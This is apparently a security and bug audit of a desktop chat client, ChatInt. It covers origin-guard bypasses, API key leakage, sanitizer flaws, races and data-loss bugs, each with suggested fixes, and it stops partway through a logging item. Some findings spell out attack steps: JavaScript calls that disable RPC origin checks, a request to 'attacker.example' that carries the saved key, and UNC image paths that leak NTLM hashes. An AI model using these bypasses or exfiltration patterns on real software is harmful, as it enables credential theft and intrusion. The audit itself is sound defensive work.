# ChatInt — Post-Fix Verification Audit: Remaining, Regressed & Newly Discovered Issues

This document is the result of a line-by-line verification audit of commit `d740fbd` against the previous `issues.md` across the entire ChatInt codebase (`src/chatint/`, `src/chatint/ui/`, `tests/`, `ChatInt.spec`, `pyproject.toml`, and `README.md`).

> **Audit Verdict Summary:**
> - **Verified Cleanly Fixed (11 items):** `H2` (SQLite FK crash guards on deleted conversations), `H3` (Python chunk coalescing + JS `requestAnimationFrame` + skipping `hljs.highlightAuto` while streaming), `M1` (background tab `token_stats` & `lastStreamError` retention), `M2` (bundled local `fonts/KaTeX_*.woff2` + `@font-face` rules, though math rendering was regressed by `C3`'s CSS sanitizer below), `M5` (socket context manager + transport exception classification), `M7` (`[Response stopped]` context placeholder for thinking-only turns), `M11` (`open_db` rollback, `WAL` in `init_db`, single `.env` read in `get_providers`), `M12` (`ChatInt.spec` `item[1]` bundle-path filtering + `certifi`), `L1` (`ResizeObserver` disconnect), `L2` (`--danger-text` + `<option>` theme rules), `L4` (dead state & duplicate `logo.ico` cleanup), and `R3` (adaptive polling + coalesced `stream_id` queue).
> - **Remaining, Partially Fixed, Regressed, or Newly Discovered (33 items below):** Several security fixes (`C1`, `C2`, `C3`) have direct bypasses or regressions, `H5` + `M11` introduced a bug where `"New Chat (1)"` permanently disables auto-naming, the `"Start a new conversation"` welcome screen never clears due to a broken CSS selector, and 7 architectural roadmap items remain unimplemented or partially implemented.

---

## Summary Overview

| Severity / Category | Count | Key Focus Areas |
| :--- | :---: | :--- |
| **1. Critical (Security & Sanitizer)** | 3 | Un-guarded public `DesktopBridge` methods (`attach_window`/`set_origin_trusted`) & `file://` drop bypass (`C1`), stored API key exfiltration via `base_url` override (`C2`), `_isSafeUrl` dummy-base local/UNC leak + UI redressing + broken KaTeX inline CSS (`C3`) |
| **2. High (Races, Data Loss & Core UX)** | 6 | `"New Chat (1)"` permanently breaks auto-naming (`H5`), welcome placeholder never clears on first message (`NEW-H1`), `renderActivePanes()` wipes unsent drafts & erases finished replies (`NEW-H2`), destructive `Regenerate`/`Edit`/`Retry` DOM loss (`NEW-H3`), post-`await` `stream_id` races (`H1`), `.env` clear-on-rename failure (`H4`) |
| **3. Medium (SDKs, Tools, Logs & State)** | 11 | OpenAI effort clamping & `reasoning_content` tool-replay `400` (`M4`), `ThreadPoolExecutor` timeout client-close race (`M6`), Markdown/JSON import-export gaps (`M8`), Win32 window class false positive (`M10`), mid-prose `<think>` tag swallowing (`NEW-M1`), multi-round tool UI/ledger bugs (`NEW-M2`), log scrubber `exc_info` bypass (`NEW-M3`), uneditable `default_model` (`NEW-M4`), Settings buffer races (`NEW-M5`), unvalidated RPCs (`NEW-M6`), KaTeX/Markdown parser edge cases (`NEW-M7`) |
| **4. Low (Polish, Persistence, Docs & Tests)** | 6 | `beforeunload` IPC teardown race (`L3`), `README.md` build/log docs (`L5`), `test_dist_exe.py` `taskkill` & fresh-build skip (`L6`), Copy button `"Copied!"` lockup (`NEW-L1`), modal `Escape`/IME/inline-edit layout bugs (`NEW-L2`), overridden SQLite `busy_timeout` (`NEW-L3`) |
| **5. Remaining Roadmap Items** | 7 | Modularizing 4,236-line `app.js` / 1,686-line `db.py` / 1,503-line `streamer.py` (`R1`), unified `ProviderAdapter` (`R2`), OS keyring encryption (`R4`), migration runner + `.bak` backup (`R5`), *"Open Logs Folder"* UI (`R6`), uniform `{ok, data, error}` DTOs (`R7`), frontend sanitizer/UI tests (`R8`) |

---

## 1. Critical Issues (Security, Origin Guard Bypasses & Sanitizer Regressions)

### C1. [Incomplete Fix / Bypassable] `DesktopBridge` Origin Guard Bypass via Public Helper Methods, Fail-Open URL Checks, & Drag-and-Drop Navigation
- **Where:** `src/chatint/bridge.py:264-311, 332-337`, `src/chatint/main.py:168-195, 225-235`, `src/chatint/ui/app.js:4131-4141`
- **What remains broken:**
  1. **Un-guarded public methods exposed to `window.pywebview.api` (`bridge.py:264, 280, 332`):** `pywebview` automatically exposes every method on `js_api=bridge` whose name does not start with `_`. Because `attach_window`, `set_origin_trusted`, and `push_event` lack a leading underscore and lack `@_guarded_rpc`, any untrusted script in the WebView can call:
     - `await window.pywebview.api.attach_window(null, "")` — setting `self._window = None`, which causes `_require_trusted_origin()` (`bridge.py:300`: `if self._window is None: return`) to **permanently disable all origin checks** on every RPC method!
     - `await window.pywebview.api.set_origin_trusted(true)` — re-enabling RPC trust directly from JS.
     - `await window.pywebview.api.push_event({...})` — injecting spoofed backend events into `_event_queue`.
  2. **Fail-open on empty/transient `get_current_url()` (`bridge.py:304-308`):** `_require_trusted_origin()` only blocks when `current_url` is truthy (`if current_url and not self._is_url_trusted(current_url):`). If `self._window.get_current_url()` raises or returns `""` during navigation transitions, the guard silently succeeds.
  3. **Over-permissive `localhost` and `file://` matching (`bridge.py:291-295`, `main.py:185-187`):**
     - When `_allowed_origin[0] == "file"`, `_is_url_trusted()` (`bridge.py:294-295`) trusts **any** `http://127.0.0.1:<any_port>/` or `http://localhost:<any_port>/index.html` running on the user's machine, and `bridge.py:292` trusts any local file path ending in `/ui/index.html`.
     - In `main.py:185`, `app_origin[0]` for `file://` is `("file", "")`, matching **every** local `file://` URI—so `_attach_origin_guard` does **not** revoke trust or navigate back if the WebView opens another local file!
     - `_attach_origin_guard` (`main.py:194`) only hooks `window.events.loaded`, which fires *after* an external document and its inline scripts have already executed.
  4. **Drag-and-drop & middle-click bypass link interception (`app.js:4131-4141`):**
     - `app.js` has no `window` `dragover` / `drop` `e.preventDefault()` handlers. Dragging and dropping a `.json`/`.md` chat file (expecting to import it) or any link/file onto the window navigates top-level WebView2 away from the app, destroying all in-memory tabs and drafts.
     - Only `click` is intercepted on `<a>` tags (`app.js:4131`), missing `auxclick` (middle-click), and `mailto:` links permitted by `_isSafeUrl` fail `/^https?:\/\//i` (`line 4134`) and hit `e.preventDefault()` (`line 4138`), doing nothing.
- **How to make it foolproof:**
  - Rename `attach_window`, `set_origin_trusted`, and `push_event` to `_attach_window`, `_set_origin_trusted`, and `_push_event` (or pass a dedicated narrow `BridgeApi` facade object to `js_api=` that contains *only* intended `@_guarded_rpc` endpoints).
  - Fail **closed** in `_require_trusted_origin()` whenever `self._window` was attached and `not current_url` or `not self._is_url_trusted(current_url)` (only allow `self._window is None` in unit tests via an explicit `_allow_headless_rpc=True` constructor flag).
  - Compare exact resolved `Path(urllib.parse.unquote(parsed.path)).resolve() == index_html.resolve()` for `file://` URLs (and exact `(scheme, hostname, port)` if `pywebview` serves over loopback HTTP).
  - Add global `dragover` and `drop` `e.preventDefault()` listeners in `app.js`, handle `auxclick`, and route `mailto:` safely or disallow it consistently.

### C2. [Incomplete Fix] Stored API Key Exfiltration via `base_url` Override in `fetch_provider_models` & `save_settings`
- **Where:** `src/chatint/bridge.py:461-545`, `src/chatint/client_manager.py:205-233, 307-324`
- **What remains broken:**
  1. While `get_provider_api_key` now masks saved keys, `DesktopBridge.fetch_provider_models(provider_id, api_key=None, base_url="https://attacker.example/v1")` (`bridge.py:516-532` -> `client_manager.py:219-233, 317-323`) resolves `api_key` from `.env` (`get_api_key_from_env`) whenever `override_api_key` is `None`/`""` and immediately sends `GET https://attacker.example/v1/models` with `Authorization: Bearer <saved_env_api_key>`!
  2. Similarly, `save_settings` (`bridge.py:461-513`, `db.py:647-687`) allows changing an existing provider's `base_url` without supplying a new `api_key` or `clear_api_key=True`, causing `BackgroundModelSyncer` to immediately transmit the previously saved `.env` key to the new host.
  3. Thus, either an XSS/RPC-origin bypass **or** a user testing an untrusted third-party OpenAI-compatible URL on an existing provider row leaks their saved `OPENAI_API_KEY` / `OPENROUTER_API_KEY` / `DEEPSEEK_API_KEY` over the network.
- **How to make it foolproof:**
  - Whenever `base_url` differs from the currently persisted `provider["base_url"]` (comparing normalized scheme + host + port) in `fetch_provider_models` or `save_settings`, require an explicit newly entered `api_key` (or unauthenticated/empty key for localhost endpoints like Ollama)—never auto-attach a secret that was saved for a different host!

### C3. [Incomplete Fix & Regression] `_isSafeUrl` Dummy-Base Flaw, UI Redressing (`position: fixed` + App Classes), Unfixed Tracking Pixels, & Broken KaTeX Rendering
- **Where:** `src/chatint/ui/app.js:1810-2025`, `src/chatint/ui/index.html:6`, `src/chatint/ui/assets/katex.min.css:1`, `src/chatint/ui/style.css:1052-1069`
- **What remains broken & regressed:**
  1. **Dummy base URL in `_isSafeUrl` allows relative local paths & `//host/share` UNC paths (`app.js:1868`):**
     ```js
     const parsed = new URL(trimmed, "https://chatint.local");
     ```
     Passing `"https://chatint.local"` causes **any** relative path (`../../../secret.png`, `other.html`) and **any** protocol-relative/UNC path (`//attacker.host/share/img.png`) to inherit `parsed.protocol === "https:"` and pass sanitization! Because the main window loads over `file://` (`main.py:227`) and CSP sets `img-src 'self' https: http:` (`index.html:6`), `<img src>` can probe local `file://` images or trigger outbound Windows SMB/UNC (`\\attacker\share`) requests (exposing Windows NTLM hashes).
  2. **UI redressing / clickjacking via unrestricted `class` + `position: fixed` (`app.js:1824, 1837-1841`):** `sanitizeMarkdownDom` allows arbitrary `class` names (including ChatInt's own `.modal-overlay.open`, `.settings-container`, `.btn-primary`) and inline `position: fixed; top: 0; left: 0; width: 100%; height: 100%;`—allowing an imported `.md`/`.json` chat or prompt-injected HTML block to overlay the entire viewport with a spoofed modal or invisible click-hijack `<a href="https://...">`.
  3. **Tracking pixels still auto-fire (`index.html:6`, `app.js:1902-1905`):** C3 bullet 3 from the prior `issues.md` was not addressed: arbitrary external `<img src="https://attacker.tld/pixel">` tags still auto-load immediately without `referrerpolicy="no-referrer"`, leaking the user's IP and timing on chat open or live streaming. Meanwhile, `index.html:6` omits `data:` from `img-src` and `blob:` from `default-src`/`connect-src`.
  4. **Sanitizer regression visually breaks KaTeX math (`app.js:1817-1820, 1833-1842`, `katex.min.css:1`, `style.css:1052`):**
     - `ALLOWED_STYLE_PROPS` omits `border-bottom-width`, `border-top-width`, `border-left-width`, `border-right-width`, `min-height`, `max-height`, and `line-height`. In `katex.min.css`, `.katex .mfrac .frac-line`, `.overline-line`, `.underline-line`, and `.hline` set `border-bottom-style: solid` with **no CSS width**, relying on KaTeX's inline `style="border-bottom-width:0.04em;"`. Stripping `border-bottom-width` causes CSS to fall back to `medium` (**`3px`**), turning every fraction bar (`\frac{a}{b}`), overline, and underline into a thick `3px` bar! Conversely, `.katex .rule` (`border: 0 solid`) and matrix vertical dividers lose `border-right-width`/`border-top-width` and become **`0px` invisible**!
     - `ALLOWED_MARKDOWN_TAGS` omits MathML `<menclose>` (`\cancel`, `\bcancel`, `\xcancel`, `\sout`), `<mlabeledtr>`, `<mglyph>`, and SVG `<circle>`, `<polygon>`, `<polyline>`.
     - `style.css:1052` `.assistant-markdown-content img` (loaded after `katex.min.css`) overrides `.katex img` metrics.
- **How to make it foolproof:**
  - Reject `trimmed.startsWith("//")` and call `new URL(trimmed)` **without** a dummy base URL so only explicit `https:`, `http:`, and (for links) `mailto:` absolute URLs or `#fragment` anchors pass.
  - Restrict `class` attributes inside `sanitizeMarkdownDom` to KaTeX tokens (inside `.katex` / `.katex-display-block`) and `hljs*` / `language-*`, and disallow `position: fixed` / `sticky` (allowing `position: relative` / `absolute` only inside `.katex`).
  - Add `referrerpolicy="no-referrer"` and `loading="lazy"` to sanitized `<img>` elements, and restrict automatic external image loading to trusted hosts (`https://upload.wikimedia.org` for Image Search) with a click-to-load button for untrusted third-party image URLs.
  - Add `border-bottom-width`, `border-top-width`, `border-left-width`, `border-right-width`, `min-height`, `max-height`, `line-height` (validating safe CSS numeric/length values) and missing MathML/SVG tags (`menclose`, `mlabeledtr`, `mglyph`, `circle`, `polygon`, `polyline`), and scope `style.css:1052` to `.assistant-markdown-content img:not(.katex img)`.

---

## 2. High-Priority Bugs (Auto-Naming Breakage, Streaming Races & Data Loss)

### H5. [Incomplete Fix & Severe Regression] `"New Chat (1)"` Deduplication Permanently Breaks Auto-Naming, `chat_named` Runs Every Turn & Resurrects Deleted Chats, and `only_if_empty` Deletes User Prompts
- **Where:** `src/chatint/db.py:834-876, 910-926, 1036-1041, 1184-1225`, `src/chatint/streamer.py:476-535`, `src/chatint/ui/app.js:637-639, 2410-2443`
- **What happens:**
  1. **`"New Chat (1)"` permanently disables auto-naming (`db.py:915`, `streamer.py:494`, `db.py:1038`):**
     - `create_conversation("New Chat")` (`db.py:915`) runs `get_unique_conversation_title("New Chat")`, which queries **all** rows in `conversations` (`SELECT title FROM conversations`, including hidden user-only drafts whose first stream failed or second split panes opened concurrently!).
     - As soon as **one** `"New Chat"` row exists in `conversations`, the next new conversation is created with `title = "New Chat (1)"`.
     - When that chat finishes its first response, `_trigger_auto_naming` (`streamer.py:494`) checks `current_title.lower() in ["new chat", ""]` (`False`!) and `update_conversation(..., only_if_default=True)` (`db.py:1038`) checks `(row["title"] or "").strip().lower() not in ("new chat", "")`—**skipping auto-naming completely!** Every subsequent new conversation stays stuck as `"New Chat (1)"`, `"New Chat (2)"`, etc. forever.
  2. **`_trigger_auto_naming` spawns a thread & emits `chat_named` on every turn (`streamer.py:485-535, 1479`):** On turns 2, 3, ..., $N$ of an already-named conversation, `stream_chat_completion` still spawns a daemon thread that queries `get_conversation` + `get_token_stats` and pushes a redundant `chat_named` event (causing duplicate `get_token_stats` DB queries, extra `persistTabsState()`, and full sidebar/tab re-renders on every reply).
  3. **Deleted conversations resurrected in sidebar (`app.js:2410-2425`):** If a user deletes a conversation right as `_run_naming` queues `chat_named`, `onStreamEvent("chat_named")` sees `!conv` and calls `state.conversations.unshift(...)`—re-inserting a ghost entry for the deleted chat into the sidebar.
  4. **Interrupted first-turn user prompts silently deleted (`app.js:637-639`, `db.py:1207-1218`):** `delete_conversation(..., only_if_empty=True)` only checks for `role = 'assistant'` messages. If a user writes a long prompt (and/or custom system prompt), hits Stop or encounters an API error before an assistant reply is saved, and closes the tab, their saved user prompt is permanently deleted.
- **How to make it foolproof:**
  - Do **not** suffix default placeholder titles (`"New Chat"`) inside `create_conversation`, OR treat `^new chat(?:\s*\(\d+\))?$` (or an explicit `is_auto_named INTEGER DEFAULT 0` column) as unnamed in both `streamer.py` and `update_conversation(only_if_default=True)`.
  - Only spawn `_trigger_auto_naming` in `stream_chat_completion` when the conversation has not yet been named.
  - Track a `recentlyDeletedConvIds` set in `app.js` (and verify `get_conversation(conversation_id)` still exists right before `_safe_dispatch` in `_run_naming`) so `chat_named` cannot resurrect deleted chats.

### NEW-H1. Welcome Placeholder (`"Start a new conversation"`) Never Clears on First Message (100% Reproducible Bug)
- **Where:** `src/chatint/ui/app.js:1593-1602, 2180-2181, 2488-2489`
- **What happens:**
  - `renderWelcomePlaceholder()` (`app.js:1595-1601`) renders:
    ```html
    <div style="display: flex; flex-direction: column; ... height: 100%; ... margin-top: 50px;">
      ...
      <div style="font-size: 15px; font-weight: 600; color: var(--text-primary);">Start a new conversation</div>
    ```
  - Both `sendMessageFromPane` (`app.js:2180`) and `onStreamEvent("start")` (`app.js:2488`) try to remove it with:
    ```js
    const welcome = messagesContainer.querySelector('div[style*="Start a new conversation"]');
    if (welcome) messagesContainer.innerHTML = "";
    ```
  - Because `"Start a new conversation"` is text content rather than part of any `style` attribute, `querySelector` **always returns `null`**! On every new chat tab, the `height: 100%; margin-top: 50px` welcome screen stays stuck above the user's message and streaming response until the pane is completely re-mounted. Also, stale `.stream-error-banner` nodes on draft tabs are not cleared when sending a new message.
- **How to make it foolproof:** Add `class="welcome-placeholder"` to the root element in `renderWelcomePlaceholder()` and remove `.welcome-placeholder` (and `.stream-error-banner`) via `welcome.remove()` (never `messagesContainer.innerHTML = ""` inside `"start"`, which would also wipe the `tempUserMsg` bubble appended in `sendMessageFromPane`!).

### NEW-H2. `renderActivePanes()` Wipes Unsaved `<textarea>` Drafts Across All Split Panes & Races `get_conversation` Against `done`
- **Where:** `src/chatint/ui/app.js:945-965, 1607-1610, 1624-1676, 2548-2585, 3890`
- **What happens:**
  1. **Unsent input text destroyed:** `tab` never stores `chatInput.value`. Every call to `renderActivePanes()`—triggered by opening/closing/moving a split pane, switching tabs, branching, importing, deleting *any* chat in the sidebar (`line 2745`), or saving Conversation Settings (`line 3890`)—clears `el.panesContainer.innerHTML = ""` and wipes all typed, unsent text in every open pane!
  2. **`get_conversation` vs. `done` race erases completed assistant reply:** If `renderActivePanes()` runs while Tab 1 is streaming (e.g., user opens Split Pane 2), `populatePaneContent` (`line 1638`) awaits `callApi("get_conversation", expectedConvId)`. If the stream finishes (`done`) while `get_conversation` is in flight, `done` sets `tab.isStreaming = false` and appends the final message; milliseconds later, `populatePaneContent` resumes with the pre-`done` DB snapshot, clears `messagesContainer.innerHTML = ""` (`line 1647`), renders the older `conv.messages`, sees `tab.isStreaming === false` (`line 1665`), and leaves the finished assistant response completely missing from the UI!
  3. **Draft user bubble & active `tool_status` lost on mid-stream re-render:** If `!tab.conversationId && tab.isStreaming`, `populatePaneContent` (`lines 1625-1627`) only mounts `createLiveStreamingRow(tab)` without the user's prompt bubble, and active `tool_status` pills (`Searching the web...`) disappear because tool state is not stored on `tab`.
- **How to make it foolproof:** Persist `tab.draftInput` on `chatInput.oninput` (and restore height + cursor on mount), track a per-tab render/stream generation counter in `populatePaneContent` so stale `get_conversation` responses re-fetch if `done` arrived mid-flight, and store `tab.pendingUserDraft` / `tab.activeToolStatus` while streaming.

### NEW-H3. Destructive `Regenerate` / `Inline Edit` / `Retry` Deletes DOM & SQLite History Before Stream Validation, Skips `abort_conversation`, & Leaves Orphaned Partial Rows
- **Where:** `src/chatint/bridge.py:820-912`, `src/chatint/ui/app.js:1476-1556, 1758-1803, 2108-2158`
- **What happens:**
  1. **DOM history wiped before RPC succeeds:** `Regenerate` (`app.js:1758-1761`), `Inline Edit` (`app.js:2109-2111`), and `Retry` (`app.js:1494`) delete message rows / error banners from the DOM *before* `await callApi(...)`. If the RPC returns `{ error }` or throws, the UI loses those messages and the Retry banner even though SQLite still has them.
  2. **SQLite history deleted before provider/client check + missing `abort_conversation`:** `bridge.py:838` (`regenerate_message`) and `bridge.py:891` (`edit_message`) permanently `DELETE` downstream messages from SQLite without first aborting any stream running on the same `conversation_id` in another tab (`StreamManager.abort_conversation(conversation_id)`) and without verifying that the selected provider is enabled and has an API key configured.
  3. **Orphaned partial assistant row on `Retry` (`app.js:1494`, `streamer.py:1461`):** When a stream fails mid-generation, `streamer.py:1461` saves the partial assistant message to SQLite. Reloading the tab renders `[UserRow, PartialAssistantRow, ErrorBannerRow]`. Clicking **Retry** walks back to `UserRow` (`line 1477`) and calls `edit_message` (which deletes `PartialAssistantRow` in SQLite), **but `line 1494` only removes `targetRow` (`ErrorBannerRow`)**, leaving `PartialAssistantRow` duplicated in the DOM above the new response!
- **How to make it foolproof:** Call `StreamManager.abort_conversation(conversation_id)` and validate provider readiness before `delete_messages_from`; in `app.js`, remove all siblings after `prevRow` (`while (prevRow.nextElementSibling) ...`) only once the RPC succeeds (or restore on failure).

### H1. [Partially Fixed] Post-`await` `activeStreamId` / `conversationId` Overwrite Race & Stale `streamingContent` Leaking Across Turns
- **Where:** `src/chatint/ui/app.js:1367-1374, 1537-1549, 1790-1796, 2144-2150, 2196-2242, 2548-2627`
- **What remains broken:**
  1. In `sendMessageFromPane` (`lines 2233-2242`), `regenerate` (`lines 1790-1792`), `inlineEditUserMessage` (`lines 2144-2146`), and `Retry` (`lines 1537-1545`), Python launches the stream thread *before* returning from the RPC. If the stream fails immediately (e.g., missing API key) or the user clicks **Stop** / switches conversations in the sidebar while `await callApi(...)` is resolving, `onStreamEvent("error")` or the sidebar click clears `tab.activeStreamId = null` and `tab.isStreaming = false`—and then the post-`await` continuation blindly executes `tab.activeStreamId = res.stream_id` and `tab.conversationId = res.conversation_id`, corrupting the tab's state!
  2. `tab.streamingContent`, `tab.streamingThinking`, and `tab.hasAutoCollapsedThinking` are **not** cleared on `done` (`line 2548`), `error` (`line 2600`), or stream start initiation—only when `"start"` arrives (`lines 2469-2471`). If `renderActivePanes()` runs before `"start"`, `createLiveStreamingRow(tab)` (`lines 1367-1374`) renders the **previous turn's entire response** inside the new live streaming bubble!
  3. `persistTabsState()` is never called when `tab.conversationId = res.conversation_id` is first assigned (`line 2237`), losing the tab-to-conversation binding if the app closes before `chat_named`.
- **How to make it foolproof:** Guard post-`await` assignments with `if (tab.activeStreamId !== clientStreamId) return;`, clear `tab.streamingContent = ""` / `tab.streamingThinking = ""` at stream initiation and in `done`/`error`, and call `persistTabsState()` as soon as `conversationId` is assigned.

### H4. [Partially Fixed] `.env` Key Clearing Fails on Simultaneous Provider Rename + Key Whitespace Stripping & Case Mismatch
- **Where:** `src/chatint/db.py:130-232, 654-667`
- **What remains broken:**
  1. **Clear Key fails when renaming a provider in the same Save (`db.py:215-221, 658`):** When `p.get("clear_api_key")` is true, `save_providers` calls `set_api_key_in_env(clean_name, "", old_provider_name=old_name)`. Inside `set_api_key_in_env` (`line 220`):
     ```python
     old_val = env_map.pop(old_key, "")
     ...
     final_val = (api_key if api_key is not None else "").strip() or old_val
     ```
     Because `"".strip()` is `""`, `"" or old_val` evaluates to `old_val`—**restoring the secret that the user explicitly clicked Clear Key to delete!**
  2. **Key whitespace stripped (`db.py:220`):** `.strip()` alters keys/tokens with intentional leading/trailing whitespace, contradicting lossless `.env` quoting.
  3. **Case-sensitivity mismatch (`db.py:145` vs `171, 190`):** `ensure_env_file()` normalizes existing keys with `.upper()`, whereas `read_env_dict()` and `write_env_dict()` match keys case-sensitively (`env_map.get(key_name)`), ignoring or duplicating lowercase keys like `openai_api_key=...`.
  4. **Redundant disk reads (`db.py:161, 177, 656-666`):** `set_api_key_in_env` calls `read_env_dict()` -> `ensure_env_file()` and `write_env_dict()` -> `ensure_env_file()`, reading `.env` 4 times per updated provider inside `save_providers`.
- **How to make it foolproof:** Add an explicit `clear: bool = False` parameter to `set_api_key_in_env` (never falling back to `old_val` when `api_key == ""` / `clear=True`), normalize `.env` variable lookups case-insensitively on uppercase `*_API_KEY`, and batch `.env` updates once per `save_providers` call.

---

## 3. Medium-Priority Bugs (SDKs, Tool Calling, Import/Export, Logging & Settings)

### M4. [Partially Fixed] Incomplete OpenAI `reasoning_effort` Clamping, Tool-Error Cache Poisoning, & Strict `reasoning_content` Rejection on Tool Replay
- **Where:** `src/chatint/streamer.py:1136-1146, 1200-1275, 1374-1377`
- **What remains broken:**
  1. **`_clamp_openai_effort` misses `gpt-5` `"max"` and all non-`"openai"` providers (`streamer.py:1136-1146`):** `_clamp_openai_effort` only triggers when `provider_id == "openai"` and `model_id` matches `o1|o3|o4`. Passing `"max"` to `gpt-5` (which supports up to `"xhigh"`, not `"max"`) or passing `"minimal"` / `"xhigh"` / `"max"` to OpenRouter, DeepSeek, Groq, or custom OpenAI-compatible endpoints causes unnecessary `400 Bad Request` roundtrips (or immediate SSE stream errors after HTTP `200` headers, because `_stream_openai` does not peek the first chunk before caching `record_resolved_thinking_level` at `line 1228`).
  2. **Tool-rejection `400` poisons `resolved_thinking` cache (`streamer.py:1252-1272`):** If a reasoning model supports `reasoning_effort="high"` but rejects `tools` with a `400` message that doesn't contain `"tool"` or `"function"` (e.g., `"Unsupported parameter combination"`), the loop downgrades `effort` all the way to `None`, succeeds on `(None, False)` at `line 1259`, and writes `resolved_thinking["high"] = "none"` to SQLite—permanently disabling thinking for that model on future non-tool chats!
  3. **`reasoning_content` breaks OpenAI tool Round 1 (`streamer.py:1374-1377`):** Appending `"reasoning_content": reasoning_str` onto `assistant_msg` in `normalized_messages` causes strict OpenAI-schema endpoints that emitted `delta.reasoning` to reject Round 1 with `400 Extra inputs are not permitted` (only DeepSeek requires `reasoning_content` echoed back on tool-call turns).
- **How to make it foolproof:** Clamp `"max" -> "xhigh"` for `gpt-5*` and clamp unsupported tiers across OpenAI-compatible providers; test `(primary_effort, use_tools=False)` *before* downgrading `effort` whenever `round_tools` is non-empty; peek the first SSE chunk before caching `resolved_thinking`; and only include `reasoning_content` in replayed assistant tool messages for DeepSeek-compatible endpoints.

### M6. [Partially Fixed] `ThreadPoolExecutor` Timeout Race Closes `client` Under Running Worker Thread & Blocks Process Exit
- **Where:** `src/chatint/client_manager.py:374-390, 416-470`
- **What remains broken:**
  - `fetch_remote_models` (`client_manager.py:416`) creates a `concurrent.futures.ThreadPoolExecutor(max_workers=1)` (which spawns **non-daemon** threads tracked by Python's `concurrent.futures.thread._threads_queues` `atexit` hook).
  - If `future.result(timeout=timeout)` times out (e.g., paginated `client.models.list()` where per-request timeout is `timeout` so multiple slow pages exceed `timeout`), `finally: cls.close_client(client)` (`line 470`) closes the underlying `httpx` client on the caller thread while the worker thread is still mid-iteration, and if the worker thread remains blocked on socket I/O, Python's `atexit` handler blocks process shutdown until it finishes.
- **How to make it foolproof:** Run `fetch_fn` on an explicit `threading.Thread(..., daemon=True)` joined with `timeout`, passing a bounded per-call timeout (`min(timeout, 15.0)`), and close `client` safely so hung network calls can never block app exit.

### M8. [Partially Fixed] Remaining Markdown / JSON Export & Import Data Loss
- **Where:** `src/chatint/bridge.py:85-252, 651-679`, `src/chatint/db.py:1150-1179`
- **What remains broken:**
  1. **Literal `</details>` or unclosed code fence breaks Markdown round-trip (`bridge.py:151, 187, 673`):** Exporting a chat where `thinking_content` contains `</details>` truncates the thought block early on re-import (`re.match(r"^\s*<details>[\s\S]*?</details>\s*", ...)`), and an unclosed ` ``` ` code fence in any message toggles `in_fence = True` for the rest of the file (`line 151`), swallowing all subsequent `### User` / `### Assistant` turns into one giant message!
  2. **`system` messages exported as `Assistant (Model)` (`bridge.py:670`):** JSON-imported conversations containing `role == "system"` messages (`db.py:1153`) export to Markdown as `### Assistant (Model)`.
  3. **Markdown export drops metadata & JSON import zeroes token counts (`bridge.py:661-676`, `db.py:1165`):** Markdown export omits `provider_id`, `thinking_level`, `max_context_messages`, and `created_at`; JSON import (`db.py:1165`) hardcodes `0, 0, 0` for per-message `prompt_tokens`, `completion_tokens`, and `cached_tokens` even when present in the exported JSON.
- **How to make it foolproof:** Escape or HTML-comment-delimit thought blocks in exported Markdown, only toggle `in_fence` when a matching closing fence exists ahead in the document, handle `role == "system"` in Markdown export/import, and preserve per-message token metadata (while keeping `token_ledger` spend at `0` if desired).

### M10. [Partially Fixed] `_find_existing_chatint_hwnd` Matches Unrelated WinForms Windows When Process Verification Fails
- **Where:** `src/chatint/main.py:72-86`
- **What remains broken:**
  - In `_enum_cb` (`main.py:83`): `if proc_ok or cls_name.startswith("WindowsForms10"):` accepts **any** WinForms window titled `"ChatInt"` even when `proc_ok` is `False` (e.g., another `.NET`/WinForms app or tool window viewing a `"ChatInt"` project/file).
- **How to make it foolproof:** Only fall back to `cls_name.startswith("WindowsForms10")` when `OpenProcess` specifically failed (`h_proc == 0`), never when `QueryFullProcessImageNameW` succeeded and proved the executable was *not* Python / `ChatInt.exe`.

### NEW-M1. `<think>` Tag Parser Swallows Normal Prose & Code Blocks Mentioning Literal `<think>`
- **Where:** `src/chatint/streamer.py:538-578`
- **What happens:** `_process_text_with_think_tags` splits unconditionally on `<think>` and `</think>` anywhere in the text stream—even mid-sentence or inside inline code / fenced code blocks (e.g., ```` ```xml\n<think>...</think>\n``` ```` or `"Models like DeepSeek emit `<think>` at the start..."`). If `<think>` appears without a closing `</think>`, **the entire remainder of the assistant's answer is diverted into `full_thinking` and hidden from the message body!**
- **How to make it foolproof:** Only enter `is_in_think_tag = True` when `<think>` appears at the **beginning** of an assistant turn/round (after optional leading whitespace) and outside fenced/inline code backticks.

### NEW-M2. Multi-Round Tool Calling Collapses Thinking Accordion Prematurely, Concatenates Thoughts Without Separator, & Loses Tokens on Aborted Tool Turns
- **Where:** `src/chatint/ui/app.js:1396-1404, 2500-2520`, `src/chatint/streamer.py:265-305, 803, 1082, 1325, 1449-1477`
- **What happens:**
  1. Once Round 0 emits any content (or `_ensure_post_tool_separator` emits `"\n\n"` at `tool_round == 1`), `tab.hasAutoCollapsedThinking` (`app.js:1396`) collapses `#live-think-${tab.id}` to `"Thought Process (Complete)"`, hiding live Round 1+ reasoning, and multi-round `full_thinking` chunks concatenate directly with no `\n\n` separator between rounds.
  2. `_run_web_search_tool_call` (`streamer.py:265-305`) cannot cancel in-flight `execute_web_search` / `execute_image_search` HTTP calls when `abort_event` is set, and still dispatches `status: "done"` (`Search complete`) after abort.
  3. In `stream_chat_completion` (`streamer.py:1449-1460`), if Round 0 consumed prompt/completion tokens to emit a `tool_call` (with `full_content == []` and `full_thinking == []`) and Round 1 errors or is stopped before emitting text, `add_message` is skipped—dropping Round 0's billed `prompt_tokens` / `completion_tokens` from `token_ledger` completely (and emitting `done` with `message: None` on stop).
- **How to make it foolproof:** Insert `\n\n` between non-empty thinking rounds, re-open/update the live thinking header when new `thinking_chunk`s arrive in Round 1+, check `abort_event.is_set()` before emitting `tool_status: "done"`, and call `record_token_usage(...)` whenever `prompt_tokens > 0 or completion_tokens > 0` even if no assistant message row is saved.

### NEW-M3. Log Secret Scrubber (`_SecretScrubFilter`) Misses Exception Tracebacks (`exc_info`) & Non-`sk-`/`AIza` API Keys
- **Where:** `src/chatint/logging_setup.py:13-44, 66-81, 95-110`
- **What happens:**
  1. `_SecretScrubFilter.filter()` only scrubs `record.getMessage()`, **not** `record.exc_info`! When `_sys_excepthook`, `_thread_excepthook`, or `logger.exception(...)` logs an exception (`lines 97, 106`, `streamer.py:1440`), `Formatter.format()` appends `formatException(record.exc_info)` *after* `filter()` has already run—writing any secret present in exception args/headers/tracebacks straight into `data/logs/chatint.log`.
